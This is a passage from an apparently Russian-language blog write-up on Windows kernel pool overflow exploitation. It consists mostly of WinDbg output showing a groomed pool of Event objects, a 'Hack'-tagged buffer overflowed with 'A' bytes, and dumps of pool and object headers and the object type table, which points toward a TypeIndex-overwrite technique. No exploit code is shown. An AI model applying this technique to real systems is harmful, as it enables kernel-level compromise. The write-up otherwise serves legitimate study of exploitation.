 <span class="mi">8513</span><span class="nx">cbc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ccc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cdc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce40</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">1</span><span class="nx">c0</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Even</span>

</code></pre></div></div>

<p>И там у нас:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mi">8513</span><span class="nx">c8c0</span> <span class="nx">L30</span>
<span class="mi">8513</span><span class="nx">c8c0</span>  <span class="mi">04400008</span> <span class="mi">6</span><span class="nx">b636148</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c8d0</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c8e0</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c8f0</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c900</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c910</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c920</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c930</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c940</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c950</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c960</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">8513</span><span class="nx">c970</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>

</code></pre></div></div>

<p>Кстати, указатель на этот ядерный пул содержится в eax (вместо принта в самом драйвере можно было получить адрес ещё из eax)
Этот адрес - на 8 байт дальше самой аллокации, потому что 4-х байтовый лонг и тег кладутся до непосредственного буфера.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mi">8513</span><span class="nx">c8c0</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">8513</span><span class="nx">c8c0</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">8513</span><span class="nx">c000</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">XSav</span>
 <span class="mi">8513</span><span class="nx">c388</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="p">....</span>
 <span class="mi">8513</span><span class="nx">c7c0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c800</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c840</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c880</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
<span class="o">*</span><span class="mi">8513</span><span class="nx">c8c0</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
        <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cac0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cbc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ccc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cdc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce40</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">1</span><span class="nx">c0</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Even</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">_POOL_HEADER</span> <span class="mi">8513</span><span class="nx">c8c0</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PreviousSize</span>     <span class="p">:</span> <span class="mi">0</span><span class="nf">y000001000 </span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PoolIndex</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000000 </span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">BlockSize</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y001000000 </span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">PoolType</span>         <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000010 </span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Ulong1</span>           <span class="p">:</span> <span class="mh">0x4400008</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">PoolTag</span>          <span class="p">:</span> <span class="mh">0x6b636148</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">AllocatorBackTraceIndex</span> <span class="p">:</span> <span class="mh">0x6148</span>
   <span class="o">+</span><span class="mh">0x006</span> <span class="nx">PoolTagHash</span>      <span class="p">:</span> <span class="mh">0x6b63</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mi">8513</span><span class="nx">c8c0</span><span class="o">+</span><span class="mi">4</span>
<span class="mi">8513</span><span class="nx">c8c4</span>  <span class="mi">48</span> <span class="mi">61</span> <span class="mi">63</span> <span class="mi">6</span><span class="nx">b</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span><span class="o">-</span><span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="nx">HackAAAAAAAAAAAA</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">_POOL_HEADER</span> <span class="mi">8513</span><span class="nx">cdc0</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PreviousSize</span>     <span class="p">:</span> <span class="mi">0</span><span class="nf">y000001000 </span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PoolIndex</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000000 </span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">BlockSize</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y000001000 </span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">PoolType</span>         <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000010 </span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Ulong1</span>           <span class="p">:</span> <span class="mh">0x4080008</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">PoolTag</span>          <span class="p">:</span> <span class="mh">0xee657645</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">AllocatorBackTraceIndex</span> <span class="p">:</span> <span class="mh">0x7645</span>
   <span class="o">+</span><span class="mh">0x006</span> <span class="nx">PoolTagHash</span>      <span class="p">:</span> <span class="mh">0xee65</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">_OBJECT_HEADER_QUOTA_INFO</span> <span class="mi">8513</span><span class="nx">cdc0</span><span class="o">+</span><span class="mi">8</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PagedPoolCharge</span>  <span class="p">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">NonPagedPoolCharge</span> <span class="p">:</span> <span class="mh">0x40</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="nx">SecurityDescriptorCharge</span> <span class="p">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="nx">SecurityDescriptorQuotaBlock</span> <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">_OBJECT_HEADER</span> <span class="mi">8513</span><span class="nx">cdc0</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mi">10</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PointerCount</span>     <span class="p">:</span> <span class="mi">0</span><span class="nx">n1</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">HandleCount</span>      <span class="p">:</span> <span class="mi">0</span><span class="nx">n1</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">NextToFree</span>       <span class="p">:</span> <span class="mh">0x00000001</span> <span class="nx">Void</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="nx">Lock</span>             <span class="p">:</span> <span class="nx">_EX_PUSH_LOCK</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="nx">TypeIndex</span>        <span class="p">:</span> <span class="mh">0xc</span> <span class="dl">''</span>
   <span class="o">+</span><span class="mh">0x00d</span> <span class="nx">TraceFlags</span>       <span class="p">:</span> <span class="mi">0</span> <span class="dl">''</span>
   <span class="o">+</span><span class="mh">0x00e</span> <span class="nx">InfoMask</span>         <span class="p">:</span> <span class="mh">0x8</span> <span class="dl">''</span>
   <span class="o">+</span><span class="mh">0x00f</span> <span class="nx">Flags</span>            <span class="p">:</span> <span class="mi">0</span> <span class="dl">''</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="nx">ObjectCreateInfo</span> <span class="p">:</span> <span class="mh">0x86e7f640</span> <span class="nx">_OBJECT_CREATE_INFORMATION</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="nx">QuotaBlockCharged</span> <span class="p">:</span> <span class="mh">0x86e7f640</span> <span class="nx">Void</span>
   <span class="o">+</span><span class="mh">0x014</span> <span class="nx">SecurityDescriptor</span> <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
   <span class="o">+</span><span class="mh">0x018</span> <span class="nx">Body</span>             <span class="p">:</span> <span class="nx">_QUAD</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">ObTypeIndexTable</span>
<span class="mi">82761</span><span class="nx">ee0</span>  <span class="mi">00000000</span> <span class="nx">bad0b0b0</span> <span class="mi">84</span><span class="nx">ec7860</span> <span class="mi">84</span><span class="nx">ec7798</span>
<span class="mi">82761</span><span class="nx">ef0</span>  <span class="mi">84</span><span class="nx">ec76d0</span> <span class="mi">84</span><span class="nx">ec74a0</span> <span class="mi">84</span><span class="nx">ec7360</span> <span class="mi">84</span><span class="nx">ec7298</span>
<span class="mi">82761</span><span class="nx">f00</span>  <span class="mi">84</span><span class="nx">ec71d0</span> <span class="mi">84</span><span class="nx">ecef78</span> <span class="mi">84</span><span class="nx">eceeb0</span> <span class="mi">84</span><span class="nx">ece818</span>
<span class="mi">82761</span><span class="nx">f10</span>  <span class="mi">84</span><span class="nx">f60418</span> <span class="mi">84</span><span class="nx">f60350</span> <span class="mi">84</span><span class="nx">f61418</span> <span class="mi">84</span><span class="nx">f61350</span>
<span class="mi">82761</span><span class="nx">f20</span>  <span class="mi">84</span><span class="nx">f5f3f0</span> <span class="mi">84</span><span class="nx">f5f328</span> <span class="mi">84</span><span class="nx">f629b8</span> <span class="mi">84</span><span class="nx">f628f0</span>
<span class="mi">82761</span><span class="nx">f30</span>  <span class="mi">84</span><span class="nx">f62828</span> <span class="mi">84</span><span class="nx">f62760</span> <span class="mi">84</span><span class="nx">f62698</span> <span class="mi">84</span><span class="nx">f625d0</span>
<span class="mi">82761</span><span class="nx">f40</span>  <span class="mi">84</span><span class="nx">f62508</span> <span class="mi">84</span><span class="nx">f62440</span> <span class="mi">84</span><span class="nx">f62378</span> <span class="mi">84</span><span class="nx">f63040</span>
<span class="mi">82761</span><span class="nx">f50</span>  <span class="mi">84</span><span class="nx">f63f78</span> <span class="mi">84</span><span class="nx">f63bd8</span> <span class="mi">84</span><span class="nx">f63b10</span> <span class="mi">84</span><span class="nx">f63a48</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">ObTypeIndexTable</span><span class="o">+</span><span class="mh">0xC</span><span class="o">*</span><span class="mi">4</span> <span class="nx">L1</span>
<span class="mi">82761</span><span class="nx">f10</span>  <span class="mi">84</span><span class="nx">f60418</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">_OBJECT_TYPE</span> <span class="mi">84</span><span class="nx">f60418</span> <span class="o">-</span><span class="nx">b</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">TypeList</span>         <span class="p">:</span> <span class="nx">_LIST_ENTRY</span> <span class="p">[</span> <span class="mh">0x84f60418</span> <span class="o">-</span> <span class="mh">0x84f60418</span> <span class="p">]</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Flink</span>            <span class="p">:</span> <span class="mh">0x84f60418</span> 
      <span class="o">+</span><span class="mh">0x004</span> <span class="nx">Blink</span>            <span class="p">:</span> <span class="mh">0x84f60418</span> 
   <span class="o">+</span><span class="mh">0x008</span> <span class="nx">Name</span>             <span class="p">:</span> <span class="nx">_UNICODE_STRING</span> <span class="dl">"</span><span class="s2">Event</span><span class="dl">"</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Length</span>           <span class="p">:</span> <span class="mh">0xa</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">MaximumLength</span>    <span class="p">:</span> <span class="mh">0xc</span>
      <span class="o">+</span><span class="mh">0x004</span> <span class="nx">Buffer</span>           <span class="p">:</span> <span class="mh">0x8cc08a88</span>  <span class="dl">"</span><span class="s2">Event</span><span class="dl">"</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="nx">DefaultObject</span>    <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
   <span class="o">+</span><span class="mh">0x014</span> <span class="nx">Index</span>            <span class="p">:</span> <span class="mh">0xc</span> <span class="dl">''</span>
   <span class="o">+</span><span class="mh">0x018</span> <span class="nx">TotalNumberOfObjects</span> <span class="p">:</span> <span class="mh">0x5043</span>
   <span class="o">+</span><span class="mh">0x01c</span> <span class="nx">TotalNumberOfHandles</span> <span class="p">:</span> <span class="mh">0x506e</span>
   <span class="o">+</span><span class="mh">0x020</span> <span class="nx">HighWaterNumberOfObjects</span> <span class="p">:</span> <span class="mh">0x5e7b</span>
   <span class="o">+</span><span class="mh">0x024</span> <span class="nx">HighWaterNumberOfHandles</span> <span class="p">:</span> <span class="mh">0x5ea6</span>
   <span class="o">+</span><span class="mh">0x028</span> <span class="nx">TypeInfo</span>         <span class="p">:</span> <span class="nx">_OBJECT_TYPE_INITIALIZER</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Length</span>           <span class="p">:</span> <span class="mh">0x50</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">ObjectTypeFlags</span>  <span class="p">:</span> <span class="mi">0</span> <span class="dl">''</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">CaseInsensitive</span>  <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">UnnamedObjectsOnly</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">UseDefaultObject</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">SecurityRequired</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">MaintainHandleCount</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">MaintainTypeList</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">SupportsObjectCallbacks</span> <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x002</span> <span class="nx">CacheAligned</span>     <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x004</span> <span class="nx">ObjectTypeCode</span>   <span class="p">:</span> <span class="mi">2</span>
      <span class="o">+</span><span class="mh">0x008</span> <span class="nx">InvalidAttributes</span> <span class="p">:</span> <span class="mh">0x100</span>
      <span class="o">+</span><span class="mh">0x00c</span> <span class="nx">GenericMapping</span>   <span class="p">:</span> <span class="nx">_GENERIC_MAPPING</span>
         <span class="o">+</span><span class="mh">0x000</span> <span class="nx">GenericRead</span>      <span class="p">:</span> <span class="mh">0x20001</span>
         <span class="o">+</span><span class="mh">0x004</span> <span class="nx">GenericWrite</span>     <span class="p">:</span> <span class="mh">0x20002</span>
         <span class="o">+</span><span class="mh">0x008</span> <span class="nx">GenericExecute</span>   <span class="p">:</span> <span class="mh">0x120000</span>
         <span class="o">+</span><span class="mh">0x00c</span> <span class="nx">GenericAll</span>       <span class="p">:</span> <span class="mh">0x1f0003</span>
      <span class="o">+</span><span class="mh">0x01c</span> <span class="nx">ValidAccessMask</span>  <span class="p">:</span> <span class="mh">0x1f0003</span>
      <span class="o">+</span><span class="mh">0x020</span> <span class="nx">RetainAccess</span>     <span class="p">:</span> <span class="mi">0</span>
      <span class="o">+</span><span class="mh">0x024</span> <span class="nx">PoolType</span>         <span class="p">:</span> <span class="mi">0</span> <span class="p">(</span> <span class="nx">NonPagedPool</span> <span class="p">)</span>
      <span class="o">+</span><span class="mh">0x028</span> <span class="nx">DefaultPagedPoolCharge</span> <span class="p">:</span> <span class="mi">0</span>
      <span class="o">+</span><span class="mh">0x02c</span> <span class="nx">DefaultNonPagedPoolCharge</span> <span class="p">:</span> <span class="mh">0x40</span>
      <span class="o">+</span><span class="mh">0x030</span> <span class="nx">DumpProcedure</span>    <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
      <span class="o">+</span><span class="mh">0x034</span> <span class="nx">OpenProcedure</span>    <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
      <span class="o">+</span><span class="mh">0x038</span> <span class="nx">CloseProcedure</span>   <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
